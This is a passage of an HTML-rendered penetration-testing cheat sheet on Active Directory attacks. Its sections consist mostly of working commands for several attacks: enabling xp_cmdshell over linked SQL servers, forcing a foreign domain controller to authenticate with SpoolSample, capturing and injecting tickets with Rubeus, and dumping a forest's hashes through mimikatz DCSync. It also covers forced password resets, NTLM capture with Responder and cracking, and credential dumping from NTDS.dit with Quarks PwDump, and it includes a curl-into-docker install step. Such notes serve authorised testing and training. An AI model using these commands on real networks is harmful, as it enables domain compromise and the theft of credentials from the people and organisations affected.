</span><span id="__span-71-6"><a id="__codelineno-71-6" name="__codelineno-71-6" href="#__codelineno-71-6"></a>
</span><span id="__span-71-7"><a id="__codelineno-71-7" name="__codelineno-71-7" href="#__codelineno-71-7"></a>#Then we can execute command on the machine&#39;s were the SQL Service runs using xp_cmdshell
</span><span id="__span-71-8"><a id="__codelineno-71-8" name="__codelineno-71-8" href="#__codelineno-71-8"></a>#Or if it is disabled enable it:
</span><span id="__span-71-9"><a id="__codelineno-71-9" name="__codelineno-71-9" href="#__codelineno-71-9"></a>EXECUTE(&#39;sp_configure &quot;xp_cmdshell&quot;,1;reconfigure;&#39;) AT &quot;SPN&quot;
</span></code></pre></div>
<p>Query execution:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>Get-SQLServerLinkCrawl -Instace &lt;SPN&gt; -Query &quot;exec master..xp_cmdshell &#39;whoami&#39;&quot;
</span></code></pre></div>
<ul>
<li>Breaking Forest Trusts</li>
</ul>
<p><em>WUT IS DIS?: \
TL;DR \
If we have a bidirectional trust with an external forest and we manage to compromise a machine on the local forest that has enabled unconstrained delegation (DCs have this by default), we can use the printerbug to force the DC of the external forest's root domain to authenticate to us. Then we can capture it's TGT, inject it into memory and DCsync to dump it's hashes, giving ous complete access over the whole forest.</em></p>
<p>Tools we are going to use:</p>
<ul>
<li><a href="https://github.com/samratashok/ADModule">AD Module</a></li>
<li><a href="https://github.com/HarmJ0y/ASREPRoast">ASREPRoast</a></li>
<li><a href="https://github.com/lkarlslund/adalanche">Adalanche</a></li>
<li><a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a></li>
<li><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a></li>
<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></li>
<li><a href="https://github.com/PowerShellMafia/PowerSploit/tree/dev">Powersploit</a></li>
<li><a href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a></li>
<li><a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a></li>
<li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a> -&gt; <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">Compiled Version</a></li>
<li><a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a></li>
</ul>
<p>Exploitation example:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>#Start monitoring for TGTs with rubeus:
</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a>Rubeus.exe monitor /interval:5 /filteruser:target-dc$
</span><span id="__span-73-3"><a id="__codelineno-73-3" name="__codelineno-73-3" href="#__codelineno-73-3"></a>
</span><span id="__span-73-4"><a id="__codelineno-73-4" name="__codelineno-73-4" href="#__codelineno-73-4"></a>#Execute the printerbug to trigger the force authentication of the target DC to our machine
</span><span id="__span-73-5"><a id="__codelineno-73-5" name="__codelineno-73-5" href="#__codelineno-73-5"></a>SpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local
</span><span id="__span-73-6"><a id="__codelineno-73-6" name="__codelineno-73-6" href="#__codelineno-73-6"></a>
</span><span id="__span-73-7"><a id="__codelineno-73-7" name="__codelineno-73-7" href="#__codelineno-73-7"></a>#Get the base64 captured TGT from Rubeus and inject it into memory:
</span><span id="__span-73-8"><a id="__codelineno-73-8" name="__codelineno-73-8" href="#__codelineno-73-8"></a>Rubeus.exe ptt /ticket:&lt;Base64ValueofCapturedTicket&gt;
</span><span id="__span-73-9"><a id="__codelineno-73-9" name="__codelineno-73-9" href="#__codelineno-73-9"></a>
</span><span id="__span-73-10"><a id="__codelineno-73-10" name="__codelineno-73-10" href="#__codelineno-73-10"></a>#Dump the hashes of the target domain using mimikatz:
</span><span id="__span-73-11"><a id="__codelineno-73-11" name="__codelineno-73-11" href="#__codelineno-73-11"></a>lsadump::dcsync /domain:external.forest.local /all
</span></code></pre></div>
<p>Detailed Articles:</p>
<ul>
<li><a href="https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/">Not A Security Boundary: Breaking Forest Trusts</a></li>
<li><a href="https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1">Hunting in Active Directory: Unconstrained Delegation &amp; Forests Trusts</a></li>
</ul>
<h1 id="active-directory-pentesting">Active Directory Pentesting</h1>
<p>Active Directory (AD) is a directory service developed by Microsoft for Windows domain networks.</p>
<div class="language-text highlight"><pre><span></span><code>- [adenumeration](https://tryhackme.com/room/adenumeration)
</code></pre></div>
<h2 id="enumeration">Enumeration</h2>
<h3 id="domain-controllers-discovery">Domain Controllers Discovery</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>dig @&lt;target-ip&gt; example.local ANY
</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a>gobuster dns -d example.local -w subdomains.txt -t 25
</span></code></pre></div>
<p><br /></p>
<h2 id="enumeration-with-bloodhound">Enumeration with BloodHound</h2>
<h3 id="1-run-bloodhound">1. Run BloodHound</h3>
<p>We use <a href="https://github.com/SpecterOps/BloodHound">BloodHound Community Edition</a>.<br />
The following command starts the Docker Compose of the BloodHound.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>curl -L https://ghst.ly/getbhce | docker compose -f - up
</span></code></pre></div>
<p>After that, we can use the web UI by accessing to <code>localhost:8080</code> in web browser.<br />
Login with the username <code>admin</code> and the password which is displayed the log when executing the above command.  </p>
<p>To specify arbitrary ip and port, set the environment variables on our attack machine:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>export BLOODHOUND_HOST=10.0.0.1
</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a>export BLOODHOUND_PORT=8090
</span></code></pre></div>
<h3 id="2-collect-data-with-bloodhoundpy">2. Collect Data with BloodHound.py</h3>
<p>Here we use <a href="https://github.com/dirkjanm/BloodHound.py">BloodHound.py</a>.<br />
Install it as follow:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>python3 -m venv venv
</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a>source venv/bin/activate
</span><span id="__span-77-3"><a id="__codelineno-77-3" name="__codelineno-77-3" href="#__codelineno-77-3"></a>pip3 install bloodhound
</span><span id="__span-77-4"><a id="__codelineno-77-4" name="__codelineno-77-4" href="#__codelineno-77-4"></a>bloodhound-python -h
</span></code></pre></div>
<p>Then</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a># -d: Domain
</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a># -u: Username
</span><span id="__span-78-3"><a id="__codelineno-78-3" name="__codelineno-78-3" href="#__codelineno-78-3"></a># -p: Password
</span><span id="__span-78-4"><a id="__codelineno-78-4" name="__codelineno-78-4" href="#__codelineno-78-4"></a># -dc: Domain Controller
</span><span id="__span-78-5"><a id="__codelineno-78-5" name="__codelineno-78-5" href="#__codelineno-78-5"></a># -c all: Collect all data
</span><span id="__span-78-6"><a id="__codelineno-78-6" name="__codelineno-78-6" href="#__codelineno-78-6"></a># -ns: Alternate the nameserver
</span><span id="__span-78-7"><a id="__codelineno-78-7" name="__codelineno-78-7" href="#__codelineno-78-7"></a>bloodhound-python -d example.local -u &#39;TABATHA_BRITT&#39; -p &#39;marlboro(1985)&#39; -dc dc.example.local -c all -ns ns.example.local
</span><span id="__span-78-8"><a id="__codelineno-78-8" name="__codelineno-78-8" href="#__codelineno-78-8"></a>
</span><span id="__span-78-9"><a id="__codelineno-78-9" name="__codelineno-78-9" href="#__codelineno-78-9"></a># If we cannot resolve the domain, try dnschef (https://github.com/iphelix/dnschef) to create a fake DNS by proxy.
</span><span id="__span-78-10"><a id="__codelineno-78-10" name="__codelineno-78-10" href="#__codelineno-78-10"></a>sudo python3 dnschef.py --fakeip &lt;target-ip&gt; --nameserver &lt;target-ip&gt;
</span></code></pre></div>
<h3 id="3-upload-collected-data">3. Upload Collected Data</h3>
<p>After running, the result files (<code>*.json</code>) generated in the current directory. Upload all these JSON files to the BloodHound in web browser.  </p>
<p>We can explore the relationship in the Active Directory.</p>
<p><br /></p>
<h2 id="investigation">Investigation</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a># List all users
</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a>net user /domain
</span><span id="__span-79-3"><a id="__codelineno-79-3" name="__codelineno-79-3" href="#__codelineno-79-3"></a>net user &lt;username&gt; /domain
</span><span id="__span-79-4"><a id="__codelineno-79-4" name="__codelineno-79-4" href="#__codelineno-79-4"></a>Get-ADUser -Filter *
</span><span id="__span-79-5"><a id="__codelineno-79-5" name="__codelineno-79-5" href="#__codelineno-79-5"></a>Get-ADUser -Identity &lt;username&gt; -Server dc.example.com -Properties *
</span><span id="__span-79-6"><a id="__codelineno-79-6" name="__codelineno-79-6" href="#__codelineno-79-6"></a>Get-ADUser -Filter &#39;Name -like &quot;*michael&quot;&#39; -Server dc.example.com | Format-Table Name,SamAccountName -A
</span><span id="__span-79-7"><a id="__codelineno-79-7" name="__codelineno-79-7" href="#__codelineno-79-7"></a>
</span><span id="__span-79-8"><a id="__codelineno-79-8" name="__codelineno-79-8" href="#__codelineno-79-8"></a># List all groups
</span><span id="__span-79-9"><a id="__codelineno-79-9" name="__codelineno-79-9" href="#__codelineno-79-9"></a>net group /domain
</span><span id="__span-79-10"><a id="__codelineno-79-10" name="__codelineno-79-10" href="#__codelineno-79-10"></a>net group &quot;&lt;group&gt;&quot; /domain
</span><span id="__span-79-11"><a id="__codelineno-79-11" name="__codelineno-79-11" href="#__codelineno-79-11"></a>PS&gt; Get-ADGroup -Identity &lt;group&gt; -Server dc.example.com -Properties *
</span><span id="__span-79-12"><a id="__codelineno-79-12" name="__codelineno-79-12" href="#__codelineno-79-12"></a>PS&gt; Get-ADGroupMember -Identity &lt;group&gt; -Server dc.example.com
</span><span id="__span-79-13"><a id="__codelineno-79-13" name="__codelineno-79-13" href="#__codelineno-79-13"></a>
</span><span id="__span-79-14"><a id="__codelineno-79-14" name="__codelineno-79-14" href="#__codelineno-79-14"></a># List the password policy
</span><span id="__span-79-15"><a id="__codelineno-79-15" name="__codelineno-79-15" href="#__codelineno-79-15"></a>net accounts /domain
</span><span id="__span-79-16"><a id="__codelineno-79-16" name="__codelineno-79-16" href="#__codelineno-79-16"></a>
</span><span id="__span-79-17"><a id="__codelineno-79-17" name="__codelineno-79-17" href="#__codelineno-79-17"></a># List AD objects
</span><span id="__span-79-18"><a id="__codelineno-79-18" name="__codelineno-79-18" href="#__codelineno-79-18"></a>$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
</span><span id="__span-79-19"><a id="__codelineno-79-19" name="__codelineno-79-19" href="#__codelineno-79-19"></a>Get-ADObject -Filter &#39;whenChanged -gt $ChangeDate&#39; -includeDeletedObjects -Server dc.example.com
</span><span id="__span-79-20"><a id="__codelineno-79-20" name="__codelineno-79-20" href="#__codelineno-79-20"></a>
</span><span id="__span-79-21"><a id="__codelineno-79-21" name="__codelineno-79-21" href="#__codelineno-79-21"></a># Retrieve information about the given domain.
</span><span id="__span-79-22"><a id="__codelineno-79-22" name="__codelineno-79-22" href="#__codelineno-79-22"></a>Get-ADDomain -Server dc.example.com
</span><span id="__span-79-23"><a id="__codelineno-79-23" name="__codelineno-79-23" href="#__codelineno-79-23"></a>
</span><span id="__span-79-24"><a id="__codelineno-79-24" name="__codelineno-79-24" href="#__codelineno-79-24"></a># Change the password of AD user
</span><span id="__span-79-25"><a id="__codelineno-79-25" name="__codelineno-79-25" href="#__codelineno-79-25"></a>Set-ADAccountPassword -Identity &lt;username&gt; -Server dc.example.com  -OldPassword (ConvertTo-SecureString -AsPlaintext &quot;oldpass&quot; -force) -NewPassword (ConvertTo-SecureString -AsPlaintext &quot;newpass&quot; -force)
</span><span id="__span-79-26"><a id="__codelineno-79-26" name="__codelineno-79-26" href="#__codelineno-79-26"></a>
</span><span id="__span-79-27"><a id="__codelineno-79-27" name="__codelineno-79-27" href="#__codelineno-79-27"></a># SYSVOL - A shared folder storing the Group Policy Objects (GPOs).
</span><span id="__span-79-28"><a id="__codelineno-79-28" name="__codelineno-79-28" href="#__codelineno-79-28"></a>dir \\dc.example.com\SYSVOL\
</span></code></pre></div>
<p><br /></p>
<h2 id="force-change-password-attack">Force Change Password Attack</h2>
<p>If we found some username/password, and other usernames, we might be able to change other user passwords. The user needs to have <strong>GenericAll</strong> permission to change passwords of other users.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a># -U: User credential who has the permission to change another user password
</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#__codelineno-80-2"></a># -I: Target IP
</span><span id="__span-80-3"><a id="__codelineno-80-3" name="__codelineno-80-3" href="#__codelineno-80-3"></a># -S: Target server name
</span><span id="__span-80-4"><a id="__codelineno-80-4" name="__codelineno-80-4" href="#__codelineno-80-4"></a>net rpc password &quot;TargetUserName&quot; &quot;myPassw0rd@123&quot; -U &quot;UserName&quot;%&quot;Password&quot; -I &quot;10.0.0.1&quot; -S &quot;EXAMPLE.LOCAL&quot;
</span></code></pre></div>
<p><br /></p>
<h2 id="microsoft-management-console-mmc">Microsoft Management Console (mmc)</h2>
<p>To setup AD, follow this instructions:</p>
<ol>
<li>Right-click on the Windows icon.</li>
<li>Click <strong>"Run"</strong> and enter <strong>"mmc"</strong> then click <strong>"OK"</strong>.</li>
<li>In the MMC, click <strong>"File → Add or Remove Snap-ins"</strong>.</li>
<li>Add all three <strong>"Active Directory…"</strong> snap-ins.</li>
<li>Right-click on the <strong>"Active Directory…"</strong> in the left pane and select <strong>"Change Forest"</strong>.</li>
<li>Enter the domain  as the Root domain and click OK.</li>
<li>Click on <strong>"View → Advanced Features"</strong>.</li>
</ol>
<p><br /></p>
<h2 id="naming-convention">Naming Convention</h2>
<p>If we found usernames list in Active Directory, we can modify usernames with naming convention.<br />
For instance,</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>john smith   -&gt; jsmith, j.smith
</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#__codelineno-81-2"></a>michael pole -&gt; mpole, m.pole
</span></code></pre></div>
<p><br /></p>
<h2 id="ssh-login-with-ad-credentials">SSH Login with AD Credentials</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>ssh dc.example.com\\&lt;ad_username&gt;@sub.dc.example.com
</span></code></pre></div>
<p><br /></p>
<h2 id="inject-credentials-into-memory">Inject Credentials into Memory</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a># /netonly: All network communications will use these injected credentials for authentication.
</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a>runas.exe /netonly /user:&lt;domain&gt;\&lt;username&gt; cmd.exe
</span></code></pre></div>
<p><br /></p>
<h2 id="dns-configuration">DNS Configuration</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a># PowerShell
</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2" href="#__codelineno-84-2"></a>$dnsip = &quot;&lt;DC_IP&gt;&quot;
</span><span id="__span-84-3"><a id="__codelineno-84-3" name="__codelineno-84-3" href="#__codelineno-84-3"></a>$index = Get-NetAdapter -Name &#39;Ethernet&#39; | Select-Object -ExpandProperty &#39;ifIndex&#39;
</span><span id="__span-84-4"><a id="__codelineno-84-4" name="__codelineno-84-4" href="#__codelineno-84-4"></a>Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
</span></code></pre></div>
<p>Now check if the configuration is set correctly.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a>nslookup dc.example.com
</span></code></pre></div>
<p><br /></p>
<h2 id="intercept-netntlm-authentication">Intercept NetNTLM Authentication</h2>
<p>Start Responder to listen for any LLMNR, NBT-NS, WPAD requests.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>sudo responder -I &lt;interface-like-eth0&gt;
</span></code></pre></div>
<p>Leave Responder running until receiving some requests.<br />
If you get NTLM hash, crack it in local machine.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>echo -n &#39;&lt;copied-NTLM-hash&gt;&#39; &gt; hash.txt
</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2" href="#__codelineno-87-2"></a>john --format=netntlmv2 --wordlist=wordlist.txt hash.txt
</span></code></pre></div>
<h1 id="active-directory-auditing">Active Directory Auditing</h1>
<p>Password Auditing on Active Directory Databases</p>
<p>PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. PowerSploit is comprised of the following modules and scripts.</p>
<ul>
<li><a href="http://resources.infosecinstitute.com/password-auditing-on-active-directory-databases/">infosecinstitute.com</a></li>
<li><a href="http://code.google.com/p/quarkspwdump/">code.google</a></li>
<li><a href="https://github.com/mattifestation/PowerSploit">PowerSploit</a></li>
<li>
<p><a href="https://github.com/mattifestation/PowerShellArsenal">PowerShellArsenal</a></p>
</li>
<li>
<p>powercat is a powershell function</p>
</li>
<li>
<p>Netcat: The powershell version. (Powershell Version 2 and Later Supported)</p>
</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a>Parameters:
</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a>
</span><span id="__span-88-3"><a id="__codelineno-88-3" name="__codelineno-88-3" href="#__codelineno-88-3"></a>-l      Listen for a connection.                             [Switch]
</span><span id="__span-88-4"><a id="__codelineno-88-4" name="__codelineno-88-4" href="#__codelineno-88-4"></a>-c      Connect to a listener.                               [String]
</span><span id="__span-88-5"><a id="__codelineno-88-5" name="__codelineno-88-5" href="#__codelineno-88-5"></a>-p      The port to connect to, or listen on.                [String]
</span><span id="__span-88-6"><a id="__codelineno-88-6" name="__codelineno-88-6" href="#__codelineno-88-6"></a>-e      Execute. (GAPING_SECURITY_HOLE)                      [String]
</span><span id="__span-88-7"><a id="__codelineno-88-7" name="__codelineno-88-7" href="#__codelineno-88-7"></a>-ep     Execute Powershell.                                  [Switch]
</span><span id="__span-88-8"><a id="__codelineno-88-8" name="__codelineno-88-8" href="#__codelineno-88-8"></a>-r      Relay. Format: &quot;-r tcp:10.1.1.1:443&quot;                 [String]
</span><span id="__span-88-9"><a id="__codelineno-88-9" name="__codelineno-88-9" href="#__codelineno-88-9"></a>-u      Transfer data over UDP.                              [Switch]
</span><span id="__span-88-10"><a id="__codelineno-88-10" name="__codelineno-88-10" href="#__codelineno-88-10"></a>-dns    Transfer data over dns (dnscat2).                    [String]
</span><span id="__span-88-11"><a id="__codelineno-88-11" name="__codelineno-88-11" href="#__codelineno-88-11"></a>-dnsft  DNS Failure Threshold.                               [int32]
</span><span id="__span-88-12"><a id="__codelineno-88-12" name="__codelineno-88-12" href="#__codelineno-88-12"></a>-t      Timeout option. Default: 60                          [int32]
</span><span id="__span-88-13"><a id="__codelineno-88-13" name="__codelineno-88-13" href="#__codelineno-88-13"></a>-i      Input: Filepath (string), byte array, or string.     [object]
</span><span id="__span-88-14"><a id="__codelineno-88-14" name="__codelineno-88-14" href="#__codelineno-88-14"></a>-o      Console Output Type: &quot;Host&quot;, &quot;Bytes&quot;, or &quot;String&quot;    [String]
</span><span id="__span-88-15"><a id="__codelineno-88-15" name="__codelineno-88-15" href="#__codelineno-88-15"></a>-of     Output File Path.                                    [String]
</span><span id="__span-88-16"><a id="__codelineno-88-16" name="__codelineno-88-16" href="#__codelineno-88-16"></a>-d      Disconnect after connecting.                         [Switch]
</span><span id="__span-88-17"><a id="__codelineno-88-17" name="__codelineno-88-17" href="#__codelineno-88-17"></a>-rep    Repeater. Restart after disconnecting.               [Switch]
</span><span id="__span-88-18"><a id="__codelineno-88-18" name="__codelineno-88-18" href="#__codelineno-88-18"></a>-g      Generate Payload.                                    [Switch]
</span><span id="__span-88-19"><a id="__codelineno-88-19" name="__codelineno-88-19" href="#__codelineno-88-19"></a>-ge     Generate Encoded Payload.                            [Switch]
</span><span id="__span-88-20"><a id="__codelineno-88-20" name="__codelineno-88-20" href="#__codelineno-88-20"></a>-h      Print the help message.                              [Switch]
</span></code></pre></div>
<p><code>powercat -l -v -p 443 -t 1000</code></p>
<ul>
<li>Quarks PwDump</li>
</ul>
<p>Quarks PwDump is new open source tool to dump various types of Windows credentials: local account, domain accounts, cached domain credentials and bitlocker. The tool is currently dedicated to work live on operating systems limiting the risk of undermining their integrity or stability. It requires administrator's privileges and is still in beta test.
Quarkspwdump</p>
<p>Dump various types of Windows credentials without injecting in any process.</p>
<div class="language-text highlight"><pre><span></span><code>- [Quarkspwdump](https://github.com/quarkslab/quarkspwdump)
</code></pre></div>
<ul>
<li>
<p>snapshot</p>
</li>
<li>
<p><a href="http://blog.quarkslab.com/quarks-pwdump.html">quarks-pwdump</a></p>
</li>
</ul>
<p>Quarks PwDump is a native Win32 open source tool to extract credentials from Windows operating systems.</p>
<p>It currently extracts : Local accounts NT/LM hashes + history Domain accounts NT/LM hashes + history stored in NTDS.dit file Cached domain credentials Bitlocker recovery information (recovery passwords &amp; key packages) stored in NTDS.dit</p>
<ul>
<li>
<p>NTDSXtract - A framework for offline forensic analysis of NTDS.DIT</p>
</li>
<li>
<p><a href="http://www.ntdsxtract.com/">ntdsxract</a></p>
<ul>
<li><a href="https://github.com/csababarta/ntdsxtract.git">ntdsxtract.git</a></li>
<li><a href="http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_3_beta.zip">ntdsxtract_v1_3_beta</a></li>
<li><a href="http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_2_beta.zip">ntdsxtract_v1_2_beta</a></li>
<li><a href="http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_1_beta.zip">ntdsxtract_v1_1_beta</a></li>
</ul>
</li>
<li>
<p>ntdsutil</p>
</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>C:\Documents and Settings\ksanchez&gt;ntdsutil
</span><span id="__span-89-2"><a id="__codelineno-89-2" name="__codelineno-89-2" href="#__codelineno-89-2"></a>ntdsutil: help
</span><span id="__span-89-3"><a id="__codelineno-89-3" name="__codelineno-89-3" href="#__codelineno-89-3"></a>
</span><span id="__span-89-4"><a id="__codelineno-89-4" name="__codelineno-89-4" href="#__codelineno-89-4"></a> ?                             - Show this help information
</span><span id="__span-89-5"><a id="__codelineno-89-5" name="__codelineno-89-5" href="#__codelineno-89-5"></a> Authoritative restore         - Authoritatively restore the DIT database
</span><span id="__span-89-6"><a id="__codelineno-89-6" name="__codelineno-89-6" href="#__codelineno-89-6"></a> Configurable Settings         - Manage configurable settings
</span><span id="__span-89-7"><a id="__codelineno-89-7" name="__codelineno-89-7" href="#__codelineno-89-7"></a> Domain management             - Prepare for new domain creation
</span><span id="__span-89-8"><a id="__codelineno-89-8" name="__codelineno-89-8" href="#__codelineno-89-8"></a> Files                         - Manage NTDS database files
</span><span id="__span-89-9"><a id="__codelineno-89-9" name="__codelineno-89-9" href="#__codelineno-89-9"></a> Group Membership Evaluation   - Evaluate SIDs in token for a given user or group
</span><span id="__span-89-10"><a id="__codelineno-89-10" name="__codelineno-89-10" href="#__codelineno-89-10"></a> Help                          - Show this help information
</span><span id="__span-89-11"><a id="__codelineno-89-11" name="__codelineno-89-11" href="#__codelineno-89-11"></a> LDAP policies                 - Manage LDAP protocol policies
</span><span id="__span-89-12"><a id="__codelineno-89-12" name="__codelineno-89-12" href="#__codelineno-89-12"></a> Metadata cleanup              - Clean up objects of decommissioned servers
</span><span id="__span-89-13"><a id="__codelineno-89-13" name="__codelineno-89-13" href="#__codelineno-89-13"></a> Popups %s                     - (en/dis)able popups with &quot;on&quot; or &quot;off&quot;
</span><span id="__span-89-14"><a id="__codelineno-89-14" name="__codelineno-89-14" href="#__codelineno-89-14"></a> Quit                          - Quit the utility
</span><span id="__span-89-15"><a id="__codelineno-89-15" name="__codelineno-89-15" href="#__codelineno-89-15"></a> Roles                         - Manage NTDS role owner tokens
</span><span id="__span-89-16"><a id="__codelineno-89-16" name="__codelineno-89-16" href="#__codelineno-89-16"></a> Security account management   - Manage Security Account Database - Duplicate SID Cleanup
</span><span id="__span-89-17"><a id="__codelineno-89-17" name="__codelineno-89-17" href="#__codelineno-89-17"></a> Semantic database analysis    - Semantic Checker
</span><span id="__span-89-18"><a id="__codelineno-89-18" name="__codelineno-89-18" href="#__codelineno-89-18"></a> Set DSRM Password             - Reset directory service restore mode administra
</span><span id="__span-89-19"><a id="__codelineno-89-19" name="__codelineno-89-19" href="#__codelineno-89-19"></a>tor account password
</span><span id="__span-89-20"><a id="__codelineno-89-20" name="__codelineno-89-20" href="#__codelineno-89-20"></a>
</span><span id="__span-89-21"><a id="__codelineno-89-21" name="__codelineno-89-21" href="#__codelineno-89-21"></a>[PARAMS]
</span></code></pre></div>
<p><em>JOHN and LC format are handled. Supported OS are Windows XP / 2003 / Vista / 7 / 2008 / 8</em></p>
<ul>
<li>Why another pwdump-like dumper tool?</li>
</ul>
<p>No tools can actually dump all kind of hash and bitlocker information at the same time, a combination of tools is always needed.</p>
<ul>
<li><a href="http://sourceforge.net/projects/libesedb/">Libesedb</a> library encounters some rare crashs when parsing different NTDS.dit files.</li>
</ul>
<p>It's safer to directly use Microsoft JET/ESE API to parse databases originally built with same functions.
Bitlocker case has been added even if some specific Microsoft tools could be used to dump those information. (Active Directory addons or VBS scripts)
The tool is currently dedicated to work live on operating systems limiting the risk of undermining their integrity or stability. It requires administrator's privileges.</p>
<p>We plan to make it work full offline, for example on a disk image.</p>
<p>How does it internally work?</p>
<hr />
<h2 id="case-1-domain-accounts-hashes-are-extracted-offline-from-ntdsdit">Case #1: Domain accounts hashes are extracted offline from NTDS.dit</h2>
<p>It's not currently full offline dump cause Quarks PwDump is dynamically linked with ESENT.dll (in charge of JET databases parsing) which differs between Windows versions. For example, it's not possible to parse Win 2008 NTDS.dit file from XP. In fact, record's checksum are computed in a different manner and database files appear corrupted for API functions. That's currently the main drawback of the tool, everything should be done on domain controller. However no code injection or service installation are made and it's possible to securely copy NTDS.dit file by the use of Microsoft VSS (Volume Shadow Copy Service).</p>
<hr />
<h2 id="case-2-bitlocker-information-dump">Case #2: Bitlocker information dump</h2>
<p>It's possible to retrieve interesting information from ActiveDirectory if some specific GPO have been applied by domain administrators (mainly "Turn on BitLocker backup to Active Directory" in group policy). Recovery password: it's a 48-digits passphrase which allow a user to mount its partition even if its password has been lost. This password can be used in Bitlocker recovery console.</p>
<p>Key Package : it's a binary keyfile which allow an user to decipher data on a damaged disk or partition. It can be used with Microsoft tools, especially Bitlocker Repair Tool.</p>
<p>For each entry found in NTDS.dit, Quarks PwDump show recovery password to STDOUT and keyfiles (key packages) are stored to separate files for each recovery GUID: {GUID_1}.pk, {GUID_2}.pk,...</p>
<p>Volume GUID: an unique value for each BitLocker-encrypted volume. Recovery GUID: recovery password identifier, it could be the same for different encrypted volumes.</p>
<p>Quarks PwDump does no retrieve TPM information yet. When ownership of the TPM is taken as part of turning on BitLocker, a hash of the ownership password can be taken and stored in AD directory service. This information can then be used to reset ownership of the TPM. This feature will be added in a further release.</p>
<p>In an enterprise environment, those GPO should be often applied in order to ensure administrators can unlock a protected volume and employers can read specific files following an incident (intrusion or various malicious acts for example).</p>
<hr />
<h2 id="case-3-local-account-and-cached-domain-credentials">Case #3: Local account and cached domain credentials</h2>
<p>There aren't something really new here, a lot of tools are already dumping them without any problems. However we have choosed an uncommmon way to dump them, only few tools use this technique.</p>
<p>Hashes are extracted live from SAM and SECURITY hive in a proper way without code injection/service. In fact, we use native registry API, especially RegSaveKey() and RegLoadKey() functions which require SeBackup and SeRestore privileges. Next we mount SAM/REGISTRY hives on a different mount point and change all keys ACL in order to extend privileges to Administrator group and not LocalSystem only. That's why we choose to work on a backup to preserve system integrity.</p>
